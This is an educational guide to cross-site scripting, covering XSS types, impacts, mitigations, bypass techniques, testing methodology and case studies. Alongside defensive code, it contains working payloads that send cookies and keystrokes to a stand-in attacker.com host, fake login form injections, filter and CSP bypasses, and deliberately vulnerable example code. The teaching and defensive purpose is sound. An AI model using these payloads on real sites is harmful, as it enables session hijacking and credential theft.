# XSS (Cross-Site Scripting) - Comprehensive Guide

## **Introduction**

XSS (Cross-Site Scripting) is a security vulnerability that allows attackers to inject malicious scripts into web pages viewed by other users. It ranks #3 in OWASP Top 10 (2017) and is one of the most common web application vulnerabilities.

### **What XSS is Used For**

Attackers use XSS to:

- **Steal session cookies** and hijack user sessions
- **Deface websites** or modify content
- **Steal sensitive data** (credentials, personal information)
- **Perform actions** on behalf of users
- **Deliver malware** or redirect users to malicious sites
- **Phish users** with fake login forms

### **Why XSS is Dangerous**

**Severity:**

- ✅ **High Impact**: Can lead to complete account compromise
- ✅ **Very Common**: Found in most web applications
- ✅ **Easy to Exploit**: Simple payloads, widespread impact
- ✅ **Hard to Detect**: Executes in victim's browser
- ✅ **Widespread**: Affects all applications displaying user input

---

## **What is XSS**

XSS (Cross-Site Scripting) occurs when an application fails to properly encode user-supplied input before including it in HTML output, allowing attackers to inject malicious JavaScript that executes in the victim's browser.

### **Basic Example**

**Vulnerable Application:**

```python
@app.route('/search')
def search():
    query = request.args.get('q')
    return f"<h1>Results for: {query}</h1>"  # XSS!

```

**Attack:**

```
URL: /search?q=<script>alert('XSS')</script>

```

**Result:**

```html
<h1>Results for: <script>alert('XSS')</script></h1>
<!-- Script executes in browser -->

```

---

## **Types of XSS Attacks**

### **1. Reflected XSS (Non-Persistent)**

**Description:** Malicious script is reflected off the web server immediately in response to user input. The payload is not stored.

**Attack Flow:**

1. Attacker crafts malicious URL with XSS payload
2. Attacker sends URL to victim (phishing email, etc.)
3. Victim clicks link
4. Server reflects payload in response
5. Script executes in victim's browser

**Example:**

```python
# Vulnerable code
@app.route('/search')
def search():
    query = request.args.get('q')
    return f"<h1>Results for: {query}</h1>"

# Attack
# URL: /search?q=<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>

```

**Characteristics:**

- Payload in URL parameters, headers, or form data
- Not stored on server
- Requires user interaction (clicking link)
- Appears to come from legitimate domain
- Often used in phishing attacks

---

### **2. Stored XSS (Persistent)**

**Description:** Malicious script is stored on the server (database, file, etc.) and executed whenever the affected page is viewed.

**Attack Flow:**

1. Attacker submits malicious script to application
2. Application stores payload (comments, posts, profiles, etc.)
3. Victim views page containing stored payload
4. Script executes in victim's browser

**Example:**

```python
# Vulnerable code
@app.route('/comment', methods=['POST'])
def add_comment():
    comment = request.form['comment']
    # Store in database without encoding
    db.comments.insert({'comment': comment})
    return "Comment added"

@app.route('/comments')
def show_comments():
    comments = db.comments.find()
    # Display without encoding - XSS!
    return render_template('comments.html', comments=comments)

# Attack
# Comment: <script>alert('XSS')</script>
# Stored in database, executed for all users viewing comments

```

**Characteristics:**

- Payload stored on server
- Affects all users viewing affected content
- No user interaction needed
- More dangerous than reflected XSS
- Harder to detect and remove

---

### **3. DOM-Based XSS**

**Description:** Malicious script is executed by manipulating the DOM in the client's browser. The vulnerability is in client-side JavaScript, not server-side code.

**Attack Flow:**

1. Attacker crafts malicious URL with payload in fragment (#)
2. Client-side JavaScript reads URL parameter/fragment
3. JavaScript unsafely writes to DOM (innerHTML, document.write, etc.)
4. Script executes in browser

**Example:**

```jsx
// Vulnerable client-side code
const urlParams = new URLSearchParams(window.location.search);
const name = urlParams.get('name');
document.getElementById('greeting').innerHTML = 'Hello ' + name;

// Attack
// URL: /page?name=<script>alert('XSS')</script>
// innerHTML executes script

```

**Common Vulnerable Functions:**

- `innerHTML`
- `outerHTML`
- `document.write()`
- `document.writeln()`
- `eval()`
- `setTimeout()` / `setInterval()` with string
- `location.href`
- `location.search`

**Characteristics:**

- Vulnerability in client-side JavaScript
- No server-side reflection needed
- Payload in URL fragment (#) or query parameters
- Harder to detect with server-side scanners
- Requires client-side testing

---

## **How XSS Works**

### **Attack Flow**

**1. Identify Input Point:**

- Find where user input is accepted (forms, URL params, headers, etc.)

**2. Submit Malicious Payload:**

- Inject JavaScript payload
- Payload designed to execute in browser context

**3. Application Processes Input:**

- Application receives input
- Input included in HTML response without encoding

**4. Browser Renders HTML:**

- Browser receives HTML containing payload
- Browser interprets HTML and executes JavaScript

**5. Script Executes:**

- Malicious JavaScript runs in victim's browser
- Script has access to:
    - Session cookies (if not HttpOnly)
    - DOM
    - LocalStorage/SessionStorage
    - Same-origin requests

---

## **Impact of XSS**

### **1. Session Hijacking**

**Impact:**

- Steal session cookies
- Impersonate users
- Gain unauthorized access

**Example:**

```jsx
// Attacker's payload
<script>
  fetch('http://attacker.com/steal?cookie=' + document.cookie);
</script>

```

**Business Impact:**

- Account compromise
- Unauthorized access
- Data breach
- Identity theft

---

### **2. Defacement**

**Impact:**

- Modify page content
- Display malicious content
- Damage reputation

**Example:**

```jsx
<script>
  document.body.innerHTML = '<h1>Hacked!</h1>';
</script>

```

---

### **3. Keylogging**

**Impact:**

- Capture user keystrokes
- Steal credentials
- Monitor user activity

**Example:**

```jsx
<script>
  document.addEventListener('keypress', function(e) {
    fetch('http://attacker.com/log?key=' + e.key);
  });
</script>

```

---

### **4. Phishing**

**Impact:**

- Display fake login forms
- Steal credentials
- Trick users into providing sensitive information

**Example:**

```jsx
<script>
  document.body.innerHTML = '<form action="http://attacker.com/phish"><input name="user"><input name="pass" type="password"><button>Login</button></form>';
</script>

```

---

### **5. Redirect Attacks**

**Impact:**

- Redirect users to malicious sites
- Steal credentials
- Deliver malware

**Example:**

```jsx
<script>
  window.location = 'http://attacker.com/malware';
</script>

```

---

## **Mitigation Strategies**

### **1. Output Encoding (Primary Defense)**

**How It Works:** Encode user input based on the context where it's displayed (HTML, JavaScript, URL, CSS).

**HTML Context Encoding:**

```python
from html import escape

user_input = "<script>alert('XSS')</script>"
safe_output = escape(user_input)
# Result: &lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;

```

**JavaScript Context Encoding:**

```python
import json

user_input = "'; alert('XSS'); //"
safe_output = json.dumps(user_input)
# Result: "'; alert('XSS'); //" (JSON-encoded)

```

**URL Context Encoding:**

```python
from urllib.parse import quote

user_input = "javascript:alert('XSS')"
safe_output = quote(user_input)
# Result: javascript%3Aalert%28%27XSS%27%29

```

**Attribute Context Encoding:**

```python
from html import escape

user_input = '" onmouseover="alert(\'XSS\')'
safe_output = escape(user_input, quote=True)
# Result: &quot; onmouseover=&quot;alert(&#x27;XSS&#x27;)

```

---

### **2. Content Security Policy (CSP)**

**How It Works:** HTTP header that restricts which sources can load content (scripts, styles, images, etc.).

**Implementation:**

```python
# Strict CSP
response.headers['Content-Security-Policy'] = (
    "default-src 'self'; "
    "script-src 'self'; "
    "style-src 'self' 'unsafe-inline'; "
    "img-src 'self' data: https:; "
    "connect-src 'self'; "
    "font-src 'self'; "
    "object-src 'none'; "
    "base-uri 'self'; "
    "form-action 'self'; "
    "frame-ancestors 'none'"
)

```

**CSP Directives:**

- `default-src`: Default policy for all resource types
- `script-src`: Controls script execution
- `style-src`: Controls stylesheet loading
- `img-src`: Controls image sources
- `connect-src`: Controls fetch/XHR requests
- `font-src`: Controls font loading
- `object-src`: Controls object/embed/applet
- `base-uri`: Controls base tag URLs
- `form-action`: Controls form submission targets
- `frame-ancestors`: Controls embedding (like X-Frame-Options)

**Best Practices:**

- Use `'self'` for same-origin resources
- Avoid `'unsafe-inline'` and `'unsafe-eval'`
- Use nonces or hashes for inline scripts/styles
- Report violations for monitoring

---

### **3. HttpOnly Cookies**

**How It Works:** Prevents JavaScript from accessing cookies via `document.cookie`.

**Implementation:**

```python
response.set_cookie(
    'sessionId',
    value=session_id,
    httponly=True,  # Prevents JavaScript access
    secure=True,    # HTTPS only
    samesite='Strict'
)

```

**Limitations:**

- Only prevents cookie theft via XSS
- Doesn't prevent XSS itself
- Use with output encoding and CSP

---

### **4. Input Validation**

**How It Works:** Validate and sanitize input on the server side.

**Implementation:**

```python
import re

def validate_input(input_value):
    # Whitelist approach: only allow safe characters
    if not re.match(r'^[a-zA-Z0-9\s.,!?-]+$', input_value):
        raise ValueError("Invalid input")
    return input_value

# Or use library
from bleach import clean

def sanitize_html(input_value):
    # Whitelist allowed tags/attributes
    allowed_tags = ['p', 'br', 'strong', 'em']
    return clean(input_value, tags=allowed_tags)

```

**Important:**

- Input validation helps but doesn't prevent XSS
- Always encode output, even if input is validated
- Use whitelist approach, not blacklist

---

### **5. Use Safe DOM Manipulation**

**For DOM-Based XSS:**

```jsx
// ❌ VULNERABLE
element.innerHTML = userInput;

// ✅ SECURE
element.textContent = userInput;

// Or use safe DOM APIs
const textNode = document.createTextNode(userInput);
element.appendChild(textNode);

```

---

## **Best Practices**

### **1. Always Encode Output**

**Rule:** Encode output based on context, immediately before rendering.

**✅ CORRECT:**

```python
from html import escape

@app.route('/user')
def show_user():
    username = request.args.get('username')
    # Encode immediately before output
    safe_username = escape(username)
    return f"<h1>Welcome, {safe_username}</h1>"

```

**❌ WRONG:**

```python
# Encoding at input time
username = escape(request.args.get('username'))
# Storing encoded value (breaks if used in different context)
db.users.insert({'username': username})

```

---

### **2. Use Framework Auto-Escaping**

**Rule:** Use templating engines with auto-escaping enabled.

**✅ CORRECT:**

```python
# Flask/Jinja2 (auto-escaping enabled by default)
@app.route('/user')
def show_user():
    username = request.args.get('username')
    return render_template('user.html', username=username)

```

```html
<!-- user.html -->
<h1>Welcome, {{ username }}</h1>  <!-- Auto-escaped! -->

```

---

### **3. Implement CSP**

**Rule:** Use strict CSP headers to reduce XSS impact.

**✅ CORRECT:**

```python
response.headers['Content-Security-Policy'] = (
    "default-src 'self'; "
    "script-src 'self'; "
    "style-src 'self' 'unsafe-inline'; "
    "img-src 'self' https:"
)

```

---

### **4. Use HttpOnly Cookies**

**Rule:** Always set HttpOnly flag on session cookies.

**✅ CORRECT:**

```python
response.set_cookie(
    'sessionId',
    value=session_id,
    httponly=True,
    secure=True,
    samesite='Strict'
)

```

---

### **5. Avoid Dangerous Functions**

**Rule:** Never use dangerous DOM manipulation functions with user input.

**❌ WRONG:**

```jsx
element.innerHTML = userInput;
element.outerHTML = userInput;
document.write(userInput);
eval(userInput);

```

**✅ CORRECT:**

```jsx
element.textContent = userInput;
const textNode = document.createTextNode(userInput);
element.appendChild(textNode);

```

---

## **Advanced Exploitation Techniques**

### **1. Bypassing Basic Filters**

**Technique: Case Variation**

```html
<ScRiPt>alert('XSS')</ScRiPt>
<sCrIpT>alert('XSS')</sCrIpT>

```

**Technique: Encoding**

```html
<!-- HTML entities -->
&lt;script&gt;alert('XSS')&lt;/script&gt;
<!-- If decoded before rendering -->

<!-- Unicode encoding -->
<script>\u0061lert('XSS')</script>

```

**Technique: Event Handlers**

```html
<img src=x onerror="alert('XSS')">
<div onclick="alert('XSS')">Click me</div>
<svg onload="alert('XSS')"></svg>

```

---

### **2. Bypassing CSP**

**Technique: JSONP Endpoints**

```html
<!-- If CSP allows 'unsafe-inline' or specific domains -->
<script src="https://trusted-cdn.com/jsonp?callback=alert"></script>

```

**Technique: Data URIs**

```html
<!-- If CSP allows data: -->
<iframe src="data:text/html,<script>alert('XSS')</script>"></iframe>

```

**Mitigation:**

- Use strict CSP
- Avoid 'unsafe-inline' and 'unsafe-eval'
- Whitelist specific sources only

---

### **3. DOM-Based XSS Bypass**

**Technique: Fragment Identifier**

```jsx
// Vulnerable code uses location.hash
const hash = location.hash.substring(1);
document.getElementById('content').innerHTML = hash;

// Attack
// URL: /page#<img src=x onerror="alert('XSS')">

```

**Technique: JSON Parsing**

```jsx
// Vulnerable: parsing JSON and using in DOM
const data = JSON.parse(userInput);
document.getElementById('name').innerHTML = data.name;

// Attack
// Input: {"name": "<img src=x onerror='alert(1)'>"}

```

---

### **4. Polyglot XSS Payloads**

**Technique: Payloads that work in multiple contexts**

```jsx
// Works in HTML, JavaScript, CSS contexts
javascript:/*--></title></style></textarea></script><svg/onload='/*--><html */ onmouseover='alert(1)'></html>

```

---

## **Penetration Testing Methodology**

### **XSS Testing Checklist**

**1. Identify Input Points:**

- URL parameters
- POST data
- HTTP headers
- Cookies
- File uploads
- WebSocket messages

**2. Test Basic Payloads:**

```html
<script>alert('XSS')</script>
<img src=x onerror="alert('XSS')">
<svg onload="alert('XSS')">

```

**3. Determine Context:**

- HTML body
- HTML attributes
- JavaScript
- URL
- CSS

**4. Context-Specific Payloads:**

**HTML Context:**

```html
<script>alert('XSS')</script>

```

**Attribute Context:**

```html
" onmouseover="alert('XSS')

```

**JavaScript Context:**

```jsx
'; alert('XSS'); //

```

**URL Context:**

```jsx
javascript:alert('XSS')

```

**5. Test Encoding Bypasses:**

- HTML entities
- Unicode encoding
- URL encoding
- Hex encoding

**6. Test Filter Bypasses:**

- Case variation
- Tag nesting
- Event handlers
- Alternative tags

---

### **Testing Tools**

**1. Burp Suite:**

- Intruder for payload testing
- XSS Validator extension
- Manual testing and validation

**2. OWASP ZAP:**

- Automated XSS scanning
- Manual testing tools
- Reporting

**3. Browser Developer Tools:**

- Console for testing
- Network tab for payload analysis
- Sources for debugging

---

## **Threat Modeling (STRIDE Framework)**

### **Spoofing**

**Threat:** Attacker spoofs legitimate user via session hijacking.

**Attack Vectors:**

- Steal session cookies via XSS
- Impersonate users
- Gain unauthorized access

**Mitigation:**

- HttpOnly cookies
- Output encoding
- CSP

**Risk Rating:** High

---

### **Tampering**

**Threat:** Attacker modifies page content or user data.

**Attack Vectors:**

- DOM manipulation
- Form tampering
- Content defacement

**Mitigation:**

- Output encoding
- CSP
- Input validation

**Risk Rating:** High

---

### **Repudiation**

**Threat:** Actions performed via XSS cannot be attributed.

**Attack Vectors:**

- Actions appear to come from victim
- No audit trail
- Difficult to investigate

**Mitigation:**

- Comprehensive logging
- Request correlation
- User activity monitoring

**Risk Rating:** Medium

---

### **Information Disclosure**

**Threat:** Attacker accesses sensitive information via XSS.

**Attack Vectors:**

- Cookie theft
- LocalStorage access
- Page content extraction
- CSRF token theft

**Mitigation:**

- HttpOnly cookies
- Output encoding
- CSP
- Secure cookie attributes

**Risk Rating:** Critical

---

### **Denial of Service**

**Threat:** Attacker causes service disruption via XSS.

**Attack Vectors:**

- Resource exhaustion
- Redirect loops
- DOM manipulation causing crashes

**Mitigation:**

- Output encoding
- CSP
- Rate limiting

**Risk Rating:** Medium

---

### **Elevation of Privilege**

**Threat:** Attacker gains elevated privileges via XSS.

**Attack Vectors:**

- Session hijacking (admin sessions)
- CSRF token theft
- API key extraction

**Mitigation:**

- HttpOnly cookies
- Output encoding
- CSP
- Token protection

**Risk Rating:** Critical

---

## **Real-World Case Studies**

### **Case Study 1: Stored XSS in Comment System**

**Background:** During penetration test, discovered stored XSS in blog comment system.

**Discovery:**

```python
# Vulnerable code
@app.route('/comment', methods=['POST'])
def add_comment():
    comment = request.form['comment']
    # No encoding!
    db.comments.insert({'comment': comment})
    return "Comment added"

@app.route('/blog/<post_id>')
def show_post(post_id):
    post = db.posts.find_one({'_id': post_id})
    comments = db.comments.find({'post_id': post_id})
    # Display without encoding
    return render_template('post.html', post=post, comments=comments)

```

**Exploitation:**

```html
<!-- Attacker's comment -->
<script>
  fetch('http://attacker.com/steal?cookie=' + document.cookie);
</script>

```

**Impact:**

- **Confidentiality**: Critical - Session cookies stolen
- **Integrity**: High - Could modify comments/content
- **Availability**: Medium - Potential DoS
- **Business Impact**: Critical - User account compromise

**Root Cause:**

- No output encoding
- No input validation
- No CSP
- Comments stored as-is

**Remediation:**

```python
from html import escape

@app.route('/comment', methods=['POST'])
def add_comment():
    comment = request.form['comment']
    # Validate and sanitize input
    comment = sanitize_html(comment)
    db.comments.insert({'comment': comment})
    return "Comment added"

@app.route('/blog/<post_id>')
def show_post(post_id):
    post = db.posts.find_one({'_id': post_id})
    comments = db.comments.find({'post_id': post_id})
    # Encode on output
    safe_comments = [escape(c['comment']) for c in comments]
    return render_template('post.html', post=post, comments=safe_comments)

```

---

### **Case Study 2: Reflected XSS in Search Functionality**

**Background:** Security assessment revealed reflected XSS in search feature.

**Discovery:**

```python
# Vulnerable code
@app.route('/search')
def search():
    query = request.args.get('q')
    # Directly reflected without encoding
    return f"<h1>Search results for: {query}</h1>"

```

**Exploitation:**

```
URL: /search?q=<script>document.location='http://attacker.com/phish?cookie='+document.cookie</script>

```

**Impact:**

- **Confidentiality**: Critical - Session hijacking
- **Integrity**: High - Phishing attacks
- **Business Impact**: Critical - Account compromise, reputation damage

**Remediation:**

```python
from html import escape

@app.route('/search')
def search():
    query = request.args.get('q')
    # Encode output
    safe_query = escape(query)
    return f"<h1>Search results for: {safe_query}</h1>"

```

---

## **Advanced Mitigations**

### **Defense in Depth Strategy**

**Layer 1: Output Encoding**

```python
from html import escape

# HTML context
safe_output = escape(user_input)

# JavaScript context
safe_output = json.dumps(user_input)

# URL context
safe_output = quote(user_input)

```

**Layer 2: Content Security Policy**

```python
response.headers['Content-Security-Policy'] = (
    "default-src 'self'; "
    "script-src 'self'; "
    "style-src 'self'; "
    "img-src 'self' https:; "
    "connect-src 'self'; "
    "frame-ancestors 'none'"
)

```

**Layer 3: HttpOnly Cookies**

```python
response.set_cookie(
    'sessionId',
    value=session_id,
    httponly=True,
    secure=True,
    samesite='Strict'
)

```

**Layer 4: Input Validation**

```python
def validate_input(input_value):
    # Whitelist approach
    if not re.match(r'^[a-zA-Z0-9\s.,!?-]+$', input_value):
        raise ValueError("Invalid input")
    return input_value

```

**Layer 5: Framework Auto-Escaping**

```python
# Use templating engine with auto-escaping
return render_template('template.html', user_input=user_input)

```

---

## **SAST/DAST Detection**

### **SAST (Static Application Security Testing)**

**Vulnerable Code Patterns:**

**1. Direct String Concatenation:**

```python
# ❌ VULNERABLE
return f"<h1>{user_input}</h1>"

# SAST Detection:
# - Pattern: String concatenation with user input in HTML
# - Severity: High
# - CWE: CWE-79 (Cross-site Scripting)

```

**2. innerHTML Usage:**

```jsx
// ❌ VULNERABLE
element.innerHTML = userInput;

// SAST Detection:
# - Pattern: innerHTML assignment with user input
# - Severity: High
# - CWE: CWE-79

```

**3. Dangerous DOM Functions:**

```jsx
// ❌ VULNERABLE
document.write(userInput);
eval(userInput);

// SAST Detection:
# - Pattern: Dangerous function with user input
# - Severity: High
# - CWE: CWE-79

```

---

### **DAST (Dynamic Application Security Testing)**

**Testing Methodology:**

**1. Identify Input Points:**

- Test all parameters, headers, cookies
- Test file uploads, WebSocket messages

**2. Submit Test Payloads:**

```html
<script>alert('XSS')</script>
<img src=x onerror="alert('XSS')">
<svg onload="alert('XSS')">

```

**3. Analyze Response:**

- Check if payload is reflected
- Check if script executes
- Determine encoding/filtering

**4. Test Bypasses:**

- Encoding variations
- Filter bypasses
- Context-specific payloads

---

## **Risk Assessment**

### **Risk Matrix**

| Vulnerability | Likelihood | Impact | Risk Level | Business Impact |
| --- | --- | --- | --- | --- |
| **Stored XSS** | High | Critical | **Critical** | Complete account compromise |
| **Reflected XSS** | High | High | **High** | Session hijacking, phishing |
| **DOM-Based XSS** | Medium | High | **High** | Client-side compromise |
| **Missing CSP** | High | Medium | **High** | Increased XSS impact |
| **No Output Encoding** | High | Critical | **Critical** | Complete vulnerability |

### **Risk Calculation**

**Example: Stored XSS**

**Likelihood:** High (0.8)

- Common vulnerability
- Easy to exploit
- Widespread impact

**Impact:** Critical (1.0)

- Session hijacking
- Account compromise
- Data theft
- Reputation damage

**Risk Score:** 0.8 × 1.0 = **0.8 (Critical Risk)**

**Business Impact:**

- **Financial**: Account compromise, fraud
- **Reputation**: Loss of customer trust
- **Legal**: Data breach notifications, liability
- **Operational**: Incident response, remediation

---

## **Summary**

XSS is a critical web application vulnerability. Key points:

1. **Always encode output** based on context (HTML, JavaScript, URL, CSS)
2. **Use CSP** to reduce XSS impact
3. **Set HttpOnly cookies** to prevent cookie theft
4. **Validate input** but don't rely on it alone
5. **Use safe DOM APIs** (textContent, not innerHTML)
6. **Test thoroughly** - code reviews, penetration testing
7. **Follow security standards** - OWASP guidelines

Remember: **XSS is prevented by output encoding based on context, not by input validation or CSP alone!**